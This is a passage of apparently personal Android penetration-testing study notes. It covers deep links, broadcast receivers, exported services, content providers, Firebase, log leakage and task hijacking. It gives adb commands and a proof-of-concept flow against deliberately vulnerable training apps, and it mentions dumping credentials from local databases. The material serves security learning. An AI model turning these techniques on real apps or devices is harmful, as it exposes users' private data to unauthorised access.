integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="45a5e5cb-6830-4229-a9ff-c6f5f407a51e" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">adb shell am start -W -a android.intent.action.VIEW -d &quot;insecureshop://com.insecureshop/web?url=https://3kal.medium.com&quot;</code></pre><p id="0a175b84-873d-41f0-93eb-9a5bd3867294" class="">Webview loads the arbitrary uri as shown below:</p><figure id="178013b1-4162-4d3a-95ff-be7a3fd099d5" class="image"><a href="https://miro.medium.com/v2/resize:fit:496/1*4DphZ_gd0dHEb98Ec0VGMQ.png"><img style="width:240px" src="https://miro.medium.com/v2/resize:fit:496/1*4DphZ_gd0dHEb98Ec0VGMQ.png"/></a></figure><p id="2aca8bd9-aa97-43d5-8f79-b85d048d262a" class="">
</p></div></details></div></details></div></details><figure id="c0381f5b-f1ed-474a-bc23-537a3b1205af"><a href="https://8ksec.io/android-deeplink-and-webview-exploitation-8ksec-blogs/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Android Deep Link issues and WebView Exploitation | 8kSec Blogs</div><div class="bookmark-description">In this Blog post, learn about Android deep link and WebView issues, explaining their targets, exploitation and security measures. Read now</div></div><div class="bookmark-href"><img src="https://i0.wp.com/8ksec.io/wp-content/uploads/2022/09/cropped-8ksec-final-2-1.png?fit=192%2C192&amp;ssl=1" class="icon bookmark-icon"/>https://8ksec.io/android-deeplink-and-webview-exploitation-8ksec-blogs/</div></div><img src="https://8ksec.io/wp-content/uploads/2023/10/8ksec-open-graph-image.png" class="bookmark-image"/></a></figure><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Native function</summary><div class="indented"><ul id="35ff8196-0a1d-4358-8948-b75efdfb4ea1" class="bulleted-list"><li style="list-style-type:disc">If you find a <code>native</code> functions , that means its code is inside native library not in java code, you will find it in the<code> lib</code> Directory inside the APK after decomposing its components using<mark class="highlight-blue"> APKtool</mark></li></ul><figure id="8195d410-55b7-4766-b77d-96a6ea7b570c" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2040.png"><img style="width:459px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2040.png"/></a></figure><p id="9edc1df8-2760-4272-8081-8516d178d567" class="">IDA tool to reverse non java code to see the assembly code</p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><mark class="highlight-default"><strong>Broadcast Receivers</strong></mark></summary><div class="indented"><p id="740cdfb8-b6d1-4877-a64f-3867fbd9817c" class="">Broadcast receivers are components in an Android app that <mark class="highlight-yellow">enable the app to</mark><em><span style="border-bottom:0.05em solid"><mark class="highlight-yellow"> respond to system-wide events or custom events</mark></span></em>. These events, known as <mark class="highlight-blue_background">broadcasts</mark>, can originate from the system itself, other apps, or even the app&#x27;s own code. Broadcast receivers <mark class="highlight-pink">can be categorized into static and dynamic</mark> based on how they are registered.</p><ol type="1" id="dc6657f9-84ed-448e-a851-6329d36acc2d" class="numbered-list" start="1"><li><mark class="highlight-yellow"><strong>Static Receivers</strong></mark><strong>:</strong><br/>Static receivers refer to <br/><mark class="highlight-orange">broadcast receivers</mark> that are declared in the <mark class="highlight-pink">AndroidManifest.xml</mark> file of the application. They are <mark class="highlight-orange">set up to listen for specific broadcast events</mark>, such as device booting, network connectivity changes, or custom events. Static receivers are <mark class="highlight-orange">registered automatically when the application is installed and </mark><mark class="highlight-pink">do not require the app to be running actively</mark>.</li></ol><ol type="1" id="52a920f1-2cb7-421e-935e-e58a85f0e37c" class="numbered-list" start="2"><li><mark class="highlight-yellow"><strong>Dynamic Receivers</strong></mark><strong>:</strong><br/>Dynamic receivers, on the other hand,<br/><mark class="highlight-pink"> are not declared in the AndroidManifest.xml file</mark>. Instead, they are<mark class="highlight-orange"> registered and unregistered programmatically within the app&#x27;s code using </mark><code>registerReceiver</code> function. This allows the app to control when the receiver is active and listening for specific broadcast events. Dynamic receivers can enhance security to some extent, as they are not exposed for potential exploitation via static declaration in the manifest.</li></ol><h3 id="3cba45d3-eb30-49d5-845d-a78c41adb006" class="">Insecure broadcast receiver</h3><ul id="91e69c2e-12a2-44ac-bfdc-39ba04cd83d0" class="bulleted-list"><li style="list-style-type:disc">function <code>registerReceiver</code> ⇒ starts a Dynamic Receivers </li></ul><ul id="13743302-24c0-4287-b7cc-e48a66b479a4" class="bulleted-list"><li style="list-style-type:disc">for static receivers :</li></ul><ol type="1" id="66b3b015-9201-42c6-a9f9-f9483de3f80d" class="numbered-list" start="1"><li>Check <code>&lt;reciever&gt;</code> in manifest if Exported “Explicitly or Implicitly by intent-filter” <figure id="44530a82-3900-4cb8-a2d9-fd6c78b114c6" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2041.png"><img style="width:864px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2041.png"/></a></figure><p id="08a1d7e4-7139-4d24-a92b-ea252d51982d" class="">Its Not a must to be exported ⇒ it may be used to respond to broadcast within the app </p></li></ol><ol type="1" id="0123ba14-b604-47c3-8373-fb466378b84c" class="numbered-list" start="2"><li>Jump to <code>onRecieve</code> Function in both <em><span style="border-bottom:0.05em solid"><strong>static </strong></span></em>and <em><span style="border-bottom:0.05em solid"><strong>dynamic </strong></span></em>⇒ to check for extras needed</li></ol><figure id="aeec41fe-93c4-48bd-b147-a92b4454e310" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2042.png"><img style="width:1471px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2042.png"/></a></figure><figure id="e4feba1d-bf48-416b-b219-fece05bfc10f" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2043.png"><img style="width:1406px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2043.png"/></a></figure><p id="4a935061-af42-4ab2-a41e-339ba36c8551" class="">⇒  receives 3 strings as extras</p><ol type="1" id="cf6effc1-91d8-4fd6-9672-0c4ba07115b9" class="numbered-list" start="3"><li>search by the action name to check any functions  call the receiver action to check for example <figure id="100f1e8e-4d2f-4e66-a71c-38b12998ea8a" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2044.png"><img style="width:720px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2044.png"/></a></figure><p id="3d94ad48-d1fe-411e-9a02-c0b2b7b1899e" class="">In  our example here’s the Function that required a Receiver , receives 3 strings as extras</p></li></ol><p id="19cb09f0-c0da-4f06-9a36-02a8aa750a56" class="">
</p><p id="68338459-91da-419b-bb5c-5923bc56b319" class="">now we can use it to push a notification </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a0ae8165-cd75-444c-9cc5-59b4c5888856" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">adb shell am broadcast -a service.vulnerable.vulnerableservice.LOG --es data &quot;TEST&quot; #example from PIVAA
adb shell am broadcast -a infosecadventures.allsafe.action.PROCESS_NOTE --es server &quot;10.10.10.10&quot; --es note &quot;Hello&quot; --es  notification_message &#x27;AndroidPT&#x27; -n infosecadventures.allsafe/.challenges.NoteReceiver #allsafe</code></pre><figure id="68483729-6248-4862-9514-8c4bc1ffe6ba" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2045.png"><img style="width:1909px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2045.png"/></a></figure><figure id="b1db72ef-901e-41cc-84bb-7e90863d218d" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2046.png"><img style="width:397px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2046.png"/></a></figure><p id="51ab0804-708c-4a2e-9470-f68a8692dc12" class="">we can use Medusa to sniff all exported intents and broadcast receivers </p><figure id="b3ae8f05-b690-41ad-80f9-96899973afd1" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2047.png"><img style="width:672px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2047.png"/></a></figure><figure id="771cf4c5-cbe4-48c9-9872-82327c332da5" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2048.png"><img style="width:576px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2048.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="821fb20c-8959-4e30-a99a-c94aa6c37fdb"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">permission re-delegation ⇒ refers to a situation where an app takes advantage of another vulnerable app to obtain permissions that it would not normally have access to. This often occurs when the vulnerable app holds sensitive permissions and doesn&#x27;t properly secure them.</div></figure></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Firebase Database</summary><div class="indented"><p id="71716420-cb3b-4d7b-a0d2-885df595c1da" class="">Firebase Realtime Database is a<mark class="highlight-pink"> </mark><em><span style="border-bottom:0.05em solid"><strong><mark class="highlight-pink">cloud-hosted NoSQL database</mark></strong></span></em><mark class="highlight-pink"> </mark>provided by <em><span style="border-bottom:0.05em solid"><strong>Google </strong></span></em>as part of the Firebase<mark class="highlight-pink"> suite of mobile application development tools</mark>. It is designed <mark class="highlight-pink">to store and synchronize data in real-time between clients</mark>, making it particularly well-suited for building real-time and collaborative applications such as <strong>chat apps, online games, collaborative document editing, and more.</strong></p><ul id="5aeafe0a-639e-4ee1-9a33-9c375c35e9da" class="bulleted-list"><li style="list-style-type:disc">test firebase data base, its found in<mark class="highlight-pink"> Strings.xml</mark> ⇒ navigate to <code>/.json </code> <br/><br/></li></ul><figure id="9e203354-6944-4db6-b64b-8fdd993d98cb" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2049.png"><img style="width:628px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2049.png"/></a></figure><figure id="2638cfb7-f1b5-43c4-8e25-d912f9ea38e0" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2050.png"><img style="width:1091px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2050.png"/></a></figure><p id="f1368a37-453e-4426-a484-0a5da60e0bfd" class="">⇒ If accessed then its vulnerable and may allow Read/Write perms not only Read.</p><p id="380a9604-fc1d-451e-9d32-603e4e73f419" class="">⇒ If permission denied then its all OK</p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Insecure services</summary><div class="indented"><ul id="c6b22b82-be77-4e4e-adb9-2a3241c9ea69" class="bulleted-list"><li style="list-style-type:disc">under <code>&lt;service&gt;</code> ⇒ check if Exported</li></ul><figure id="e5c16924-9884-44ac-bc43-50466034b088" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2051.png"><img style="width:1359px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2051.png"/></a></figure><ul id="4efc74c8-71d9-4a4c-8cf9-d42f26851650" class="bulleted-list"><li style="list-style-type:disc">head to <code>onStartCommand</code> to understand the flow </li></ul><figure id="9113c3b1-6e26-421c-bc5c-fbe9393af097" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2052.png"><img style="width:576px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2052.png"/></a></figure><figure id="3d5ce09f-513c-473a-a013-7d7d8cea32ed" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2053.png"><img style="width:528px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2053.png"/></a></figure><p id="b04166c5-1b4a-426a-b466-05e2465c0692" class="">
</p><figure id="2abc0be8-66a0-4463-937e-d639f92cefb0" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2054.png"><img style="width:1032px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2054.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2f4b4e6e-7fed-49da-a893-ccb4dea8286f" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">adb shell am startservice com.htbridge.pivaa/.handlers.VulnerableService #PIVAA
adb shell am startservice infosecadventures.allsafe/.challenges.RecorderService</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Insecure content provider</summary><div class="indented"><p id="afb48784-be19-45e9-bae0-0b3cb5051c6e" class=""><code>&lt;provider&gt;</code> tag</p><figure id="d70e06c1-8c22-46f6-b81d-6c251a05c2e5" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2055.png"><img style="width:1361px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2055.png"/></a></figure><figure id="4380cfbf-4533-4aae-9325-6b7053d67355" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2056.png"><img style="width:1291px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2056.png"/></a></figure><p id="97ab3538-20d0-4113-9b93-d2a43ca3737c" class="">NotesProvider Class:</p><figure id="5b377a3b-9b56-4e54-9994-79996008537d" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2057.png"><img style="width:1430px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2057.png"/></a></figure><ul id="3db57737-35f2-4f30-9680-9e910cbc0b64" class="bulleted-list"><li style="list-style-type:disc">Content Provider URI schema ⇒ <code>content:// </code></li></ul><ul id="cd881a7e-f442-4121-8a71-752d3b4161b5" class="bulleted-list"><li style="list-style-type:disc">If the content provider is <mark class="highlight-orange">Exported </mark>we can directly call it</li></ul><figure id="aa1ba204-e012-48fd-81bd-3a7d1d771c8f" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2058.png"><img style="width:768px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2058.png"/></a></figure><p id="5b2ec32f-0ea0-45ff-9965-61ec9553d9a8" class="">uri ⇒ is<code> content://</code> then <code> android:authorities</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9505913a-c181-40bf-9c6b-89c3ad668161" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">adb shell content query --uri &quot;content://app.beetlebug.provider/users&quot; #another example if theres a table u neeed to provide in the uri
adb shell content query --uri &quot;content://infosecadventures.allsafe.dataprovider&quot;

Row: 0 id=1, user=admin, note=I can not believe that Jill is still using 123456 as her passwor
Row: 1 id=2, user=elliot.alderson, note=A bug is never just a mistake. It represents
Row: 2 id=3, user=darlene.alderson, note=That’s the trick about money.
Row: 3 id=4, user=gideon.goddard, note=You’re never sure about anything unl</code></pre><p id="d7f1323e-e560-4098-b76f-34635358b97d" class=""><strong>If its not exported</strong></p><p id="8a1659e3-b8e4-4258-b52a-78cd31a3865d" class="">if it has ⇒ <code>grantUriPermissions=&quot;true&quot;</code>  then we can use this permission to access <code>content://</code> </p><p id="12472705-5d85-445f-9c6f-1fb3756aa4cc" class="">by using another<code> exported activity</code> that can receive<code> whole intent </code>and redirerct it to this activity</p><p id="a8fb909f-8c6b-45cc-a942-e822394e3818" class="">⇒ In our example we found class of ProxyActivity, that takes intent as extra </p><figure id="7be4c53f-6f33-4f82-8574-285053dcdaac" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2059.png"><img style="width:1166px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2059.png"/></a></figure><p id="9e8471d2-4ed1-4740-8fe0-f99b9bab7542" class="">and its exported in the manifest</p><p id="a06cbb82-21df-4189-8cea-eb33963b7ee6" class=""><code>&lt;activity android:name=&quot;infosecadventures.allsafe.ProxyActivity&quot; android:exported=&quot;true&quot;/&gt;</code></p><p id="d123818c-523a-4fb3-86d2-846dd80475a8" class="">so our POC will be </p><figure id="1e2623e8-9f0d-4e9c-b062-cb1a3bfb722e" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2060.png"><img style="width:1190px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2060.png"/></a></figure><figure id="a50c97de-acdd-4b59-8679-586cd2a23c9e" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2061.png"><img style="width:1175px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2061.png"/></a></figure></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><mark class="highlight-red">Dynamic analysis</mark></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Definition</summary><div class="indented"><ul id="0c333fb4-6c7a-4aae-bbd2-232818a198da" class="bulleted-list"><li style="list-style-type:disc">Known as &quot;<mark class="highlight-pink">black-box</mark>&quot; analysis, is the execution of the APK in a controlled environment (e.g., <mark class="highlight-pink">emulator or physical device</mark>). During execution, the tester<mark class="highlight-pink"> monitors the app&#x27;s behavior</mark>, <em><span style="border-bottom:0.05em solid">network traffic</span></em>, and <em><span style="border-bottom:0.05em solid">interactions with the device&#x27;s resources to identify vulnerabilities and security weaknesses</span></em>.</li></ul><ul id="6de16066-8257-4317-b2fb-73a396c46743" class="bulleted-list"><li style="list-style-type:disc">Dynamic analysis is usually conducted<mark class="highlight-pink"> after the app has been deployed</mark> or <mark class="highlight-pink">during the testing phase</mark>. It assesses <em><span style="border-bottom:0.05em solid">how the app behaves in a real-world scenario</span></em>, including its interaction with external servers and services.</li></ul><ul id="09abf4fe-5f85-48f7-8bfd-b83b62dfda8e" class="bulleted-list"><li style="list-style-type:disc">Dynamic analysis<mark class="highlight-pink"> focuses on runtime vulnerabilities</mark>, including<mark class="highlight-pink"> improper data handling</mark>,<mark class="highlight-pink"> sensitive data leakage</mark>,<mark class="highlight-pink"> insecure communication</mark>, and<mark class="highlight-pink"> runtime behavior anomalies</mark>.</li></ul><ul id="383abc46-b5e8-4d9d-82ba-3440d5566559" class="bulleted-list"><li style="list-style-type:disc">While dynamic analysis<mark class="highlight-pink"> can involve automation for certain tasks </mark>(e.g., automated testing scripts), it often requires manual interaction to explore the app thoroughly.</li></ul><ul id="9b911ac1-b608-4831-84cf-9adda96113ec" class="bulleted-list"><li style="list-style-type:disc">Common dynamic analysis tools for Android include mobile app penetration testing frameworks like <mark class="highlight-pink">Frida </mark>, <mark class="highlight-pink">Drozer</mark>, <mark class="highlight-pink">Burp Suite</mark>, and various mobile security testing platforms.</li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Logs</summary><div class="indented"><ul id="08aef7a6-e6b0-4d68-a6a9-f68e41476162" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-blue">logcat</mark> is a tool to monitor all logs from the device, to specify a pid we use  <code>--pid</code> arg </li></ul><p id="a683c1b6-5252-4ee8-b448-e230df775738" class="">we use it to check for any app leaks in logs during use</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6e283428-71a8-478d-8bea-b868d731629a" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">#In case of Diva ⇒ Dynamic allocation to the PID , now we can monitor Diva logs
adb logcat --pid=$(adb shell pidof -s jakhar.aseem.diva)</code></pre><ul id="95b5443f-ce8d-4b9e-bb25-df6c8322ddc1" class="bulleted-list"><li style="list-style-type:disc">logs are always inside <code>Log.blabla</code> e.g. <code>Log.e</code> for errors </li></ul><figure id="5d5025d5-83d8-42af-8e4b-a2ae004cdfed" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2062.png"><img style="width:768px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2062.png"/></a></figure><p id="f38bf053-f1ab-4451-8861-f670f9ac00f4" class="">as shown above the error is because of the<code> Log.e</code> part as it dumps the<em><span style="border-bottom:0.05em solid"> cc.txt as a string in the logs</span></em></p><p id="9324e27e-bb28-4ac8-a3fb-4d68388160fb" class=""><mark class="highlight-blue">Jadx </mark>can search in the entire App with keywords or Regex , so we can specify a Regex ⇒ <code>^Log.. </code>to search for all types of logs , remove <code>^</code> if u didn’t find outputs</p><figure id="f0276a95-81be-42b0-9ad0-a0774d183994" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2063.png"><img style="width:576px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2063.png"/></a></figure><p id="13f3e8b2-e8b5-4ca0-9935-7a9f3d18bb9a" class=""><code> Mitigation : Don’t log sensitive info</code></p><ul id="31f06e15-d1cf-45c6-ac90-dbeee862cba4" class="bulleted-list"><li style="list-style-type:disc">Also, its recommended checking for <mark class="highlight-pink">Hardcoded creds</mark> or <mark class="highlight-pink">crypto keys</mark> as well as<mark class="highlight-pink"> checking in Strings.xml</mark></li></ul><ul id="ccd6c623-f1a2-4423-9cc4-768209234685" class="bulleted-list"><li style="list-style-type:disc">Check for <mark class="highlight-pink">Insecure Data storage</mark>, as it may be <mark class="highlight-pink">stored locally in shared_prefs</mark> directory in<mark class="highlight-pink"> preferences.xml </mark>file</li></ul><p id="f990a548-bb66-4548-b02b-d1cc4d59a776" class="">in ⇒  <code>/data/data/YOUR_PACKAGE_NAME/shared_prefs/YOUR_PREFS_NAME.xml</code></p><figure id="52cf08e6-451d-400b-b722-bb0c2b648238" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2064.png"><img style="width:576px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2064.png"/></a></figure><p id="c69f7e9e-9da2-4f65-84d9-28db130efa21" class="">Read mode about data<mark class="highlight-pink"> storage here</mark>:</p><figure id="fcf5b3dc-00c0-4926-97c5-244a5688f4d5"><a href="https://github.com/OWASP/owasp-mastg/blob/master/Document/0x05d-Testing-Data-Storage.md" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title"></div></div><div class="bookmark-href">https://github.com/OWASP/owasp-mastg/blob/master/Document/0x05d-Testing-Data-Storage.md</div></div></a></figure><p id="a659ad32-3842-429b-b92b-1b9354314f84" class=""><a href="https://www.notion.so/Android-Pentest-02aae17ad648406bb91477d99704c0fc?pvs=21">https://www.notion.so/02aae17ad648406bb91477d99704c0fc?pvs=25#8d1d1e1d14254e299a2836e74eeadee3</a></p><ul id="e589e719-19ba-4321-b6f2-cab275229378" class="bulleted-list"><li style="list-style-type:disc">If<mark class="highlight-pink"> data is stored in a local database</mark>, we can examine it using <mark class="highlight-blue">sqlite3 </mark>and navigate through tables to dump creds</li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>Task Hijacking (StrandHogg) “</strong>2 versions”</summary><div class="indented"><p id="a9e8eec0-4d78-4c28-8b3a-cefb6f44b8c3" class="">Version1</p><figure id="f26643c7-ed34-49f1-9cf3-730f95e39641" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2065.png"><img style="width:674px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2065.png"/></a></figure><ul id="083873a3-dd26-4b9a-b4df-bc5e4c3c2be6" class="bulleted-list"><li style="list-style-type:disc">A task is a <mark class="highlight-teal_background">collection of activities that users interact with when performing a certain job</mark>. </li></ul><ul id="01270fd4-34b0-416f-9ac9-c49eb5285788" class="bulleted-list"><li style="list-style-type:disc">The activities are <mark class="highlight-blue_background">arranged in a stack</mark>—the <em><strong>back stack</strong></em>)—in the order in which each activity is opened.</li></ul><ul id="0edd02c1-20fc-4a00-8584-5a1e19f145be" class="bulleted-list"><li style="list-style-type:disc">The activity that <mark class="highlight-blue_background">is </mark><mark class="highlight-blue_background"><strong>displayed</strong></mark><mark class="highlight-blue_background"> on the screen is called a </mark><mark class="highlight-blue_background"><strong>foreground</strong></mark><mark class="highlight-blue_background"> </mark><mark class="highlight-blue_background"><strong>activity</strong></mark> and its <strong>task</strong> is called the <mark class="highlight-blue_background"><strong>foreground</strong></mark><mark class="highlight-blue_background"> </mark><mark class="highlight-blue_background"><strong>task</strong></mark>. At a time, only <strong>one foreground task is visible on the screen</strong>.</li></ul><p id="3bdae137-2363-4a4e-9ca6-242a3ff948ce" class="">Activities are stack structured, every activity u do in app is put on a stack, when u apply <mark class="highlight-pink">moveToBack</mark> it makes it go back down to the stack which makes it not the current active activity.</p><hr id="681fa90a-0f86-414f-ac09-f9f23b7b60f2"/><ul id="c5d455a3-172c-42a6-9a36-4715c0345368" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-pink"><strong>excludeFromRecent</strong></mark><strong>:</strong> This attribute<mark class="highlight-pink"> hides the app</mark> from both<mark class="highlight-pink"> foreground and background</mark> while it&#x27;s loaded and<mark class="highlight-pink"> running in memory</mark>.</li></ul><p id="09c3550e-090c-409d-8022-0a538033275f" class=""><mark class="highlight-pink"><strong>Task Affinity</strong></mark><strong>:</strong> Task affinity is an attribute defined in each <code><strong>&lt;activity&gt;</strong></code> tag in the <code><strong>AndroidManifest.xml</strong></code> file. It&#x27;s a way of saying, &quot;These activities belong together.”. By <mark 